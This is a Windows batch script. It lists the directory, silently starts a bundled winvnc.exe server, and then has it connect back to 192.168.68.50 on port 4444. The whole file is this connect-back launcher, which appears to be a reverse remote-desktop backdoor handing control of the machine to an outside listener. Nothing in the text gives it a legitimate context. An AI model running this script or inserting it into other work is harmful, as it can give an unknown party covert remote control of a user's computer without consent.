@echo off
echo Current directory contents:
dir
timeout /t 3 >nul
start "" "%~dp0winvnc.exe" -run
timeout /t 3 >nul
start "" "%~dp0winvnc.exe" -connect 192.168.68.50::4444
